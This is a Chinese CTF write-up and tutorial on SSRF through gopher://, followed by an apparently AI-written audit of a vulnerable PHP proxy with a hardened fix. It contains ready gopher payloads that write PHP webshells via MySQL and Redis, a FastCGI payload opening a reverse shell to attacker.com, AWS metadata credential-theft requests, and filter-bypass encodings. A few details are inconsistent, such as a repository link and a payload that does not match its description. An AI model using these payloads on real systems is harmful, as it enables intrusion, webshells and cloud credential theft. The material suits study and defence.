> PS：由于出现权限问题，取消了mysql密码，端口还原为3306

发现一个登陆框，抓包登陆后发现疑似SSRF的地方，测试后确认是SSRF
![[0022红包题第九弹-附件.png]]

于是使用GITHUB工具https://github.com/tarunkant/Gopherus
`python gopherus.py --exploit mysql` 根据提示得到疑似是mysql的漏洞，所有构造mysql的poc，注意这个工具需要python2.
使用sql语句写入一句话php木马
`select '<?php eval($_POST[hack]); ?>' INTO OUTFILE '/var/www/html/test.php';` 

```shell
(py27) apple@MacBook-Air-2 Gopherus-master % python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: select '<?php eval($_POST[hack]); ?>' INTO OUTFILE '/var/www/html/test.php';

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4d%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%68%61%63%6b%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%74%65%73%74%2e%70%68%70%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

获得POC之后对其进行URL编码，使用yakit放入post数据中
```
u=admin&returl=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%33%33%30%36%2f%5f%25%61%33%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%37%25%33%32%25%33%35%25%33%35%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%32%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%34%35%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%37%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%37%30%25%36%38%25%37%30%25%36%39%25%36%65%25%36%36%25%36%66%25%32%38%25%32%39%25%33%62%25%32%30%25%33%66%25%33%65%25%32%37%25%32%30%25%34%39%25%34%65%25%35%34%25%34%66%25%32%30%25%34%66%25%35%35%25%35%34%25%34%36%25%34%39%25%34%63%25%34%35%25%32%30%25%32%37%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%37%34%25%36%35%25%37%33%25%37%34%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30%25%32%37%25%33%62%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31
```
然后使用蚁剑链接发现根目录有flag.txt
`ctfshow{a2d9d2e2-118c-4704-97c4-9e92dc1d06a1}`

其中如果想提前确认漏洞是否可以利用，可以修改SQL语句为
`select '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/testa.php';`
得到
`gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%74%65%73%74%61%2e%70%68%70%27%3b%01%00%00%00%01`
如果直接传送数据后访问testa.php访问来判断是否能够查看php配置信息，如果没放应则需要尝试编码绕过跳过，找到能够绕过限制的方法再实际去构造攻击代码

![[Pasted image 20251022224812.png]]
----




          
# Gopher协议及其在CTF中的利用

Gopher协议是一种早期的互联网协议，在CTF比赛中经常被用作攻击向量，特别是在SSRF（服务器端请求伪造）漏洞利用中。下面我将详细介绍Gopher协议的基本概念、工作原理以及在CTF中的多种利用方式。

## 一、Gopher协议基本概念

### 1. 什么是Gopher协议

Gopher协议是在1991年由明尼苏达大学开发的一种互联网协议，它在HTTP协议出现之前就已经存在。Gopher设计用于分发、搜索和检索文档，是一种比HTTP更简单的协议。它使用了一种菜单式的界面，允许用户浏览层次化的文档结构。

### 2. Gopher协议的特点

- **简单性**：比HTTP协议更简单，没有复杂的头部和状态管理
- **层次化**：使用目录结构组织信息
- **纯文本传输**：主要传输纯文本内容
- **端口**：默认使用70端口
- **URL格式**：`gopher://host:port/gopher-path`

### 3. Gopher协议的工作原理

Gopher协议的工作流程相对简单：
1. 客户端连接到Gopher服务器（默认端口70）
2. 客户端发送请求（通常是一个选择器字符串）
3. 服务器返回响应（通常是一个菜单或文件内容）
4. 连接关闭

## 二、Gopher协议在CTF中的利用

### 1. SSRF漏洞利用

在CTF中，Gopher协议最常见的利用方式是通过SSRF漏洞。SSRF允许攻击者从服务器端发起请求，而Gopher协议的灵活性使其成为SSRF攻击的理想选择。

#### 基本原理

当一个Web应用允许用户提供URL，并且服务器会访问这个URL时，如果没有严格过滤，攻击者可以提供一个Gopher URL。服务器会按照Gopher协议解析并发送请求，这使得攻击者可以：

1. 构造任意TCP数据包
2. 与内网服务通信
3. 绕过一些基于协议的过滤

### 2. 利用Gopher协议攻击内网服务

#### 攻击Redis服务

Redis是一个常见的内存数据库，默认不需要认证，这使其成为Gopher攻击的理想目标。

**攻击步骤：**

1. **构造Redis命令**：
   ```
   set mykey "\n\n<?php eval($_POST['cmd']); ?>\n\n"
   config set dir /var/www/html
   config set dbfilename shell.php
   save
   ```

2. **转换为Gopher协议格式**：
   每个命令前需要添加`*<参数数量>\r\n$<参数长度>\r\n<参数内容>\r\n`

3. **URL编码**：
   将构造好的Gopher payload进行URL编码

4. **最终Payload示例**：
   ```
   gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Amykey%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
   ```

#### 攻击MySQL服务

MySQL也是Gopher攻击的常见目标，特别是当攻击者知道凭证时。

**攻击步骤：**

1. **构造MySQL协议数据包**：
   MySQL使用特定的协议格式，需要构造包含认证信息和SQL命令的数据包

2. **转换为Gopher协议格式**：
   将MySQL协议数据包转换为Gopher可接受的格式

3. **最终Payload示例**：
   ```
   gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%65%6c%65%63%74%20%22%3C%3F%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3E%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%22
   ```

#### 攻击FastCGI

FastCGI是Web服务器与动态脚本语言（如PHP）之间的接口，也可以通过Gopher协议攻击。

**攻击步骤：**

1. **构造FastCGI协议数据包**：
   需要了解FastCGI协议格式，构造包含PHP代码执行的请求

2. **转换为Gopher协议格式**：
   将FastCGI协议数据包转换为Gopher可接受的格式

3. **最终Payload示例**：
   ```
   gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/attacker.com/1234%200%3E%261%22%27%29%3B%3F%3E%00%00%00%00
   ```

### 3. 利用Gopher协议进行端口扫描

Gopher协议还可以用于端口扫描，特别是在SSRF漏洞中。

**原理：**
- 如果目标端口开放，Gopher请求会成功
- 如果目标端口关闭，会返回错误

**示例Payload：**
```
gopher://127.0.0.1:22/
```

通过尝试连接不同端口，可以判断哪些端口是开放的。

### 4. 利用Gopher协议绕过防护

在一些CTF挑战中，可能会有对URL协议的过滤，但过滤不完全。例如：

- 过滤了`http://`和`https://`，但没有过滤`gopher://`
- 过滤了`gopher://`，但可以使用URL编码绕过：`%67%6f%70%68%65%72%3a%2f%2f`
- 过滤了特定字符，但可以通过双重URL编码绕过

## 三、Gopher协议利用工具和技巧

### 1. 常用工具

- **Gopherus**：专门用于生成Gopher Payload的工具，支持多种服务（Redis、MySQL、FastCGI等）
  ```bash
  git clone https://github.com/tarunkant/Gopherus.git
  cd Gopherus
  python2 gopherus.py --exploit redis
  ```
  **国内源方法**：
  如果GitHub访问慢，可以使用Gitee镜像：
  ```bash
  git clone https://gitee.com/mirrors/Gopherus.git
  ```

- **gopher-burp-proxy**：Burp Suite插件，用于将HTTP请求转换为Gopher Payload
  ```bash
  git clone https://github.com/tarunkant/Gopherus.git
  ```
  **国内源方法**：
  ```bash
  git clone https://gitee.com/mirrors/gopher-burp-proxy.git
  ```

### 2. 手动构造Gopher Payload的技巧

1. **使用Wireshark捕获流量**：
   - 在本地模拟攻击
   - 使用Wireshark捕获TCP数据包
   - 提取原始数据并转换为Gopher格式

2. **使用Python脚本转换**：
   ```python
   def convert_to_gopher(data):
       result = ""
       for c in data:
           result += "%{:02x}".format(ord(c))
       return result
   
   raw_data = "\x00\x01\x02..."  # 原始数据
   gopher_payload = "gopher://127.0.0.1:6379/_" + convert_to_gopher(raw_data)
   print(gopher_payload)
   ```

3. **注意事项**：
   - Gopher URL中的第一个字符通常是下划线`_`
   - 需要对特殊字符进行URL编码
   - 不同语言和框架对Gopher协议的支持可能不同

## 四、防御措施

了解攻击的同时，也应该知道如何防御：

1. **禁用危险协议**：在应用中禁用不必要的URL协议，特别是Gopher
2. **白名单验证**：只允许访问特定的域名和IP
3. **使用安全库**：使用经过安全加固的HTTP客户端库
4. **内网服务加固**：为内网服务（如Redis、MySQL）设置强认证
5. **网络隔离**：使用网络隔离技术，限制Web服务器对内网的访问

## 五、总结

Gopher协议在CTF中是一个强大的攻击工具，特别是在SSRF漏洞利用中。它的灵活性使攻击者能够构造任意TCP数据包，攻击内网服务。理解Gopher协议的工作原理和利用方式，不仅有助于解决CTF挑战，也有助于理解和防御实际环境中的SSRF漏洞。

在实际CTF比赛中，Gopher协议利用通常需要结合具体的场景和目标服务，灵活运用上述技术和工具，才能成功完成挑战。



----


check.php代码AI分析
```php
<?php
if(isset($_POST['returl'])){
        $url = $_POST['returl'];
    if(preg_match("/file|dict/i",$url)){
        die();
    }
            echo _request("$url");

}


function _request($curl,$https=true,$method='get',$data=null)
{
$ch=curl_init(); //初始化
curl_setopt($ch,CURLOPT_URL,$curl);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
curl_setopt($ch,CURLOPT_HEADER,false);//设置不需要头信息
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);//获取页面内容，但不输出
if($https)
{
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);//不做服务器认证
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,FALSE);//不做客户端认证
}

if($method=='post')
{
    curl_setopt($ch, CURLOPT_POST,true);//设置请求是post方式
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);//设置post请求数据
    
}

$str=curl_exec($ch);//执行访问
curl_close($ch);//关闭curl，释放资源
return $str;    
}

?>

```

          
下面我从代码审计的角度，系统性检查你给出的 PHP 代码是否存在漏洞，并结合常见 CTF 攻击手法，给出攻击原理、可复现的步骤、可能造成的安全隐患，以及多种修复思路与优劣。

一、代码概览与问题定位
你给的核心逻辑是一个“后端代理拉取远程 URL”并返回响应的功能：

- 入口：POST 参数 returl
- 简单过滤：仅用正则过滤了 “file|dict”
- 访问：curl 请求目标 URL（允许自动跳转 FollowLocation），默认关闭 HTTPS 证书校验（ssl verify peer/host false）
- 输出：将远程响应原样 echo 给客户端

风险集中在：
- 未限制可访问的协议、域名、IP、端口
- 允许自动跳转，可能被 30x 引导到内网或敏感服务
- 关闭 HTTPS 证书校验
- 原样回显远程响应，造成信息回显（数据外泄）

二、主要漏洞与攻击原理

1) SSRF（服务器端请求伪造）核心问题
- 原理：服务端根据用户提供的 URL 发起请求，且没有严格的白名单/协议/内网 IP 限制，攻击者可让服务器去访问内网服务或云环境元数据。
- 你当前的过滤仅拦截字符串 file 和 dict，但仍允许 http、https、gopher、ftp 等。即使拦截了 file/dict，也可以通过编码绕过（比如 di%63t://），或不需要绕过直接利用 http/https 访问内网。

风险与影响：
- 探测和访问内网 Web 管理页面（例如 127.0.0.1、10.x、172.16-31、192.168.x、169.254.169.254）
- 获取云环境敏感信息（例如 AWS 的 169.254.169.254 最新凭据与 token）
- 访问内网常见服务（如 Redis、MySQL、FastCGI、Consul、Etcd、Jenkins 等），有机会进一步 RCE

2) 跟随重定向引发的内网穿透
- 原理：CURLOPT_FOLLOWLOCATION=true 导致服务端会自动跟随 30x Location。攻击者可以构造一个外网地址，返回 302 重定向到内网地址（如 http://127.0.0.1:6379），从而“绕过域名白名单”。
- 风险：即使做了域名白名单，若未限制重定向协议/目标，依然可到达内网。

3) HTTPS 证书校验关闭
- 原理：CURLOPT_SSL_VERIFYPEER/FALSE + CURLOPT_SSL_VERIFYHOST/FALSE 关闭证书校验。可被中间人攻击，或误信伪造站点。
- 风险：数据完整性、身份认证失效；配合 SSRF 可更隐蔽地访问恶意站点。

4) 过滤逻辑可被编码绕过
- 原理：preg_match("/file|dict/i", $url) 是对原始字符串做匹配。如果攻击者把协议名部分做百分号编码，例如 di%63t:// 或 fi%6ce://，正则不会匹配，但 cURL 仍会正确解析为 dict/file。
- 风险：绕过本意的禁止协议，直接访问敏感资源。

5) 原样回显远程响应
- 原理：echo _request("$url") 会把远端响应直接拼进你自己的 HTTP 响应中。等同于“开放代理”或“服务器端内容注入”。
- 风险：配合 SSRF 可将内网接口响应直接外泄；也可能把恶意 HTML/JS 注入到你的站点响应中，造成下游浏览器安全问题。

三、可复现的攻击步骤示例（仅限在合法授权的测试环境中操作）

说明：以下示例假设你的脚本路径为 http://target.com/ssrf.php。为符合你系统（macOS）的要求，我给出 curl 命令，一次一个命令。

- 内网探测与访问
```bash
curl -X POST -d 'returl=http://127.0.0.1:80/' http://target.com/ssrf.php
```
可能直接把本机 80 端口服务的内容回显出来（如果有服务）。

- 云环境元数据（例如 AWS）
```bash
curl -X POST -d 'returl=http://169.254.169.254/latest/meta-data/' http://target.com/ssrf.php
```
进一步枚举到凭证：
```bash
curl -X POST -d 'returl=http://169.254.169.254/latest/meta-data/iam/security-credentials/' http://target.com/ssrf.php
```

- 重定向到内网的绕过
先构造一个外网 URL A（你控制），A 返回 302 Location 指向 http://127.0.0.1:6379。你的服务由于 FollowLocation=true，会自动跳转到内网 Redis 端口。

- 端口扫描（时间侧信道或响应差异）
通过更换 returl 的端口，观察响应/耗时差异：
```bash
curl -X POST -d 'returl=http://127.0.0.1:22/' http://target.com/ssrf.php
```

- 使用 Gopher 对内网服务发送原始 TCP（进阶）
如果 cURL 支持 gopher，能够构造原始数据与内网服务交互，比如 Redis 写 WebShell（CTF常见手法）。例如（示意，实际 payload 略长）：
```bash
curl -X POST --data-urlencode 'returl=gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Ainfo%0D%0A' http://target.com/ssrf.php
```
说明：/_ 后跟的是 URL 编码过的原始字节流（RESP 协议），可用来 set/config/save 等操作，最终将恶意文件落盘到 Web 目录。

四、对应的安全隐患总结
- 内网信息泄露：数据库、配置中心、内部管理接口（包括 cookieless admin 面板）
- 云凭证泄露：导致跨账户或资源进一步被攻陷
- RCE 风险：结合 Redis、FastCGI、Jenkins、Consul 等服务，可能进一步落地命令执行
- 开放代理：你的服务被滥用来攻击第三方，导致合规与法律风险
- 中间人与假证书风险：关闭证书校验会信任伪造的 HTTPS 站点

五、修复思路（多种方案与优劣）

方案 A：强白名单（域名/路径）+ 禁止重定向（推荐起点）
- 做法：只允许访问明确的安全域名集合（例如 api.example.com），禁止 FollowLocation 或限制最大重定向且重定向目标仍需在白名单内。
- 优点：实现简单，立竿见影。能有效阻断绝大多数 SSRF。
- 缺点：不灵活，业务需要访问第三方动态 URL 时会受限；误配白名单会造成业务回归问题。

方案 B：协议/IP/端口多维度黑白名单 + DNS 固化（更稳健）
- 做法：
  - 仅允许 http/https（使用 CURLOPT_PROTOCOLS/CURLOPT_REDIR_PROTOCOLS）
  - 校验 Host 解析后的 IP 不在内网/保留网段（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, fc00::/7, ::1 等）
  - 限制端口范围（如仅 80/443）
  - 解析后在请求全流程中保持 IP 不变（防 DNS rebinding），重定向目标也必须复验
- 优点：更细粒度安全控制，同时保留一定灵活性。
- 缺点：实现复杂度更高，需要严格测试避免误拦截。

方案 C：开启 HTTPS 严格校验 + 超时/重试 + 限速
- 做法：开启 CURLOPT_SSL_VERIFYPEER/VERIFYHOST；设置连接/请求超时与最大重定向次数；对该接口做限流、并发限制。
- 优点：提升整体健壮性与安全性，减少被滥用与阻断长时间挂起。
- 缺点：只能降低风险，不能从根本上杜绝 SSRF。

方案 D：中转/代理层（安全请求网关）
- 做法：后端不直接访问用户提供 URL，而是把请求交给“安全代理服务”，由它统一做协议/域名/IP 校验与审计。
- 优点：安全逻辑集中，易于维护与扩展。
- 缺点：需要额外架构投入，短期改造成本高。

六、示例修复代码（安全校验 + 安全 cURL 选项）
下面给出一个更安全的参考实现（新文件），包含协议/IP 校验、重定向限制、开启证书校验与超时。你可以据此替换现有逻辑。

```php:src/ssrf_safe.php
<?php
/**
 * 更安全的 URL 请求实现：仅允许 http/https，禁止内网/保留地址，限制端口，限制重定向，开启证书校验。
 * 说明：需要在业务入口处调用 safe_request($url) 而不是直接 _request($url)。
 */

/**
 * 检查 IP 是否在私有或保留网段
 */
function is_private_ip(string $ip): bool {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        // IPv6 本地环回、链路本地、ULA 等
        $private6 = [
            '::1', // loopback
        ];
        if (in_array($ip, $private6, true)) return true;
        // 简单阻断 ULA fc00::/7 与 链路本地 fe80::/10（可根据需要扩展 CIDR 判断）
        if (str_starts_with(strtolower($ip), 'fc') || str_starts_with(strtolower($ip), 'fe80')) return true;
        return false;
    } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        $long = ip2long($ip);
        $ranges = [
            ['10.0.0.0',   '10.255.255.255'],   // 私网 A
            ['172.16.0.0', '172.31.255.255'],   // 私网 B
            ['192.168.0.0','192.168.255.255'],  // 私网 C
            ['127.0.0.0',  '127.255.255.255'],  // 回环
            ['169.254.0.0','169.254.255.255'],  // 链路本地（云元数据常用）
        ];
        foreach ($ranges as [$start, $end]) {
            if ($long >= ip2long($start) && $long <= ip2long($end)) return true;
        }
        return false;
    }
    return true; // 非法 IP 一律视为私有
}

/**
 * 解析并校验 URL：协议、端口、域名解析后的 IP、禁止重定向到非安全目标
 */
function validate_url(string $url): array {
    $parts = parse_url($url);
    if ($parts === false || !isset($parts['scheme']) || !isset($parts['host'])) {
        return [false, '非法 URL'];
    }
    $scheme = strtolower($parts['scheme']);
    if (!in_array($scheme, ['http','https'], true)) {
        return [false, '仅允许 http/https 协议'];
    }
    $port = $parts['port'] ?? ($scheme === 'https' ? 443 : 80);
    if (!in_array($port, [80,443], true)) {
        return [false, '端口不允许'];
    }
    // DNS 解析并校验 IP
    $ip = gethostbyname($parts['host']);
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return [false, '域名解析失败'];
    }
    if (is_private_ip($ip)) {
        return [false, '目标 IP 位于内网/保留网段，拒绝访问'];
    }
    return [true, ['scheme'=>$scheme, 'host'=>$parts['host'], 'port'=>$port, 'ip'=>$ip]];
}

/**
 * 安全的请求函数（替换 _request），限制协议/端口，开启证书校验与超时，限制重定向。
 */
function safe_request(string $url, string $method='GET', ?array $data=null, int $timeout=8): string {
    [$ok, $info] = validate_url($url);
    if (!$ok) {
        http_response_code(400);
        return 'URL 校验失败：' . (is_string($info) ? $info : '非法');
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // 仅允许 http/https 协议与重定向协议
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);

    // 限制重定向，且你也可以考虑关闭（更安全）
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);

    // 证书校验开启（https 时）
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

    // 超时设置
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);

    // UA 与最小化暴露
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');

    if (strtoupper($method) === 'POST' && is_array($data)) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    }

    $resp = curl_exec($ch);
    if ($resp === false) {
        $err = curl_error($ch);
        curl_close($ch);
        http_response_code(502);
        return '上游访问失败：' . $err;
    }
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode >= 400) {
        http_response_code(502);
        return '上游返回错误，HTTP ' . $httpcode;
    }

    // 建议不要原样回显，可做内容类型与长度限制、必要的过滤
    return $resp;
}

// 示例入口：替代原先逻辑
if (isset($_POST['returl'])) {
    $url = $_POST['returl'] ?? '';
    echo safe_request($url, 'GET', null, 8);
} else {
    http_response_code(400);
    echo '缺少参数 returl';
}
```

七、进一步加固建议
- 关闭或严格限制 FollowLocation，并对每一次重定向目标重新做 validate_url 校验
- 对响应做安全处理：限制 Content-Type（例如仅允许 application/json），限制内容大小，去除潜在恶意 HTML
- 日志与限流：记录来源 IP、URL、响应码，设置速率限制与并发限制，避免被滥用为开放代理
- 若必须访问第三方动态地址：引入“安全代理层”，统一白名单策略、报错与审计

八、结论
这段代码存在高风险 SSRF 漏洞和其他安全隐患。攻击者可以通过构造 returl 值访问内网服务、云元数据、甚至利用 gopher 对内网中间件实施进一步攻击，并将响应内容直接外泄。建议尽快按上述方案进行修复，优先实现协议/域名/IP 白名单与重定向限制、开启证书校验与超时，并避免原样回显远端响应。
        